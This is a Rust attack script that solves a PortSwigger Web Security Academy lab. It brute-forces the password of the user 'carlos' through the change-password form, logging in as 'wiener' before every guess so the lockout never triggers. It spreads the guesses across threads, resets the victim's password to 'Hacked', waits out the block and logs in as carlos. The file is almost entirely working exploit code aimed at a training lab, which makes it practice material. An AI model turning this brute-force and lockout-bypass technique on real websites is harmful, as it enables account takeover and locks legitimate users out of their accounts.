/**********************************************************************
*
* Lab: Password brute-force via password change
*
* Hack Steps: 
*      1. Read password list
*      2. Brute force carlos password via password change 
*         functionality and change his password (login as wiener 
*         before every try to bypass blocking)
*      3. Wait 1 minute to bypass blocking
*      4. Login as carlos with the new password
*
***********************************************************************/
use lazy_static::lazy_static;
use rayon::iter::{IntoParallelRefIterator, ParallelIterator};
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    fs,
    io::{self, Write},
    sync::atomic::{AtomicBool, AtomicUsize, Ordering},
    thread,
    time::{self, Duration, Instant},
};
use text_colorizer::Colorize;

const LAB_URL: &str = "https://0ace0059036a947580b335640021008e.web-security-academy.net"; // Change this to your lab URL
const NEW_CARLOS_PASSWORD: &str = "Hacked"; // You can change this to what you want

lazy_static! {
    static ref COUNTER: AtomicUsize = AtomicUsize::new(0);
    static ref PASSWORD_IS_FOUND: AtomicBool = AtomicBool::new(false);
    static ref SCRIPT_START_TIME: Instant = time::Instant::now();
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Reading password list.. ");

    let password_list = read_password_list("../../passwords.txt"); // Make sure the file exist in your root directory or change its path accordingly
    let total_count = password_list.iter().count();

    println!("{}", "OK".green());
    println!("⦗2⦘ Brute forcing carlos password.. ");

    let threads = 8; // You can experiment with the number of threads by adjusting this variable
    let mini_lists = build_mini_lists_for_threads(&password_list, threads);
    brute_force_password_in_multiple_threads(mini_lists, total_count);

    let password_is_found = PASSWORD_IS_FOUND.fetch_and(true, Ordering::Relaxed);
    if password_is_found {
        print!("\n⦗3⦘ Waiting 1 minute to bypass blocking.. ");
        wait_one_minute();

        println!("{}", "OK".green());
        print!("⦗4⦘ Logging in as carlos with the new password.. ");

        let login_as_carlos = login("carlos", NEW_CARLOS_PASSWORD);
        let session = get_session_cookie(&login_as_carlos);
        fetch_with_session("/my-account", &session);

        println!("{}", "OK".green());
    } else {
        println!("{}", "⦗!⦘ Failed to change carlos password".red());
    }

    print_finish_message();
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn read_password_list(file_path: &str) -> Vec<String> {
    let passwords_big_string = fs::read_to_string(file_path)
        .expect(&format!("Failed to read the file: {}", file_path.red()));
    passwords_big_string.lines().map(|p| p.to_owned()).collect()
}

fn build_mini_lists_for_threads(big_list: &Vec<String>, threads: usize) -> Vec<Vec<String>> {
    let list_per_thread_size = big_list.len() / threads;
    big_list
        .chunks(list_per_thread_size)
        .map(|f| f.to_owned())
        .collect()
}

fn brute_force_password_in_multiple_threads(mini_lists: Vec<Vec<String>>, total_count: usize) {
    // Use every mini list in a different thread
    mini_lists.par_iter().for_each(|mini_list| {
        for password in mini_list {
            let is_found = PASSWORD_IS_FOUND.fetch_and(true, Ordering::Relaxed);
            if is_found {
                return; // Exit from the thread if the correct password was found
            } else {
                let login_as_wiener = login("wiener", "peter");
                let session = get_session_cookie(&login_as_wiener);
                let change_password =
                    change_carlos_password(&session, password, NEW_CARLOS_PASSWORD);

                if change_password.status().as_u16() == 200 {
                    print_correct_password(password);
                    PASSWORD_IS_FOUND.fetch_or(true, Ordering::Relaxed);
                    return;
                } else {
                    let counter = COUNTER.fetch_add(1, Ordering::Relaxed);
                    print_progress(counter, total_count, password);
                }
            }
        }
    })
}

fn login(username: &str, password: &str) -> Response {
    let data = &HashMap::from([("username", username), ("password", password)]);
    WEB_CLIENT
        .post(&format!("{LAB_URL}/login"))
        .form(&data)
        .send()
        .expect(&format!("⦗!⦘ Failed to login as: {}", username))
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*);", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn change_carlos_password(session: &str, current_password: &str, new_password: &str) -> Response {
    WEB_CLIENT
        .post(&format!("{LAB_URL}/my-account/change-password"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", "carlos"),
            ("current-password", current_password),
            ("new-password-1", new_password),
            ("new-password-2", new_password),
        ]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed change carlos password"))
}

fn fetch_with_session(path: &str, session: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn print_correct_password(password: &str) {
    println!("\n🗹 Correct password: {}", password.green());
    println!("🗹 Password was changed to: {}", NEW_CARLOS_PASSWORD.green());
}

fn print_progress(counter: usize, total_count: usize, password: &str) {
    let elapsed_time = (SCRIPT_START_TIME.elapsed().as_secs()).to_string();
    print!(
        "\r❯❯ Elapsed: {:2} seconds || Trying ({}/{total_count}): {:50}",
        elapsed_time.yellow(),
        counter + 1,
        password.blue()
    );
    flush_terminal();
}

fn wait_one_minute() {
    flush_terminal();
    thread::sleep(Duration::from_secs(60))
}

fn print_finish_message() {
    let elapsed_time = (SCRIPT_START_TIME.elapsed().as_secs()).to_string();
    println!("🗹  Finished in: {} seconds", elapsed_time.yellow());
    println!("🗹 The lab should be marked now as {}", "solved".green());
}

fn flush_terminal() {
    io::stdout().flush().unwrap();
}
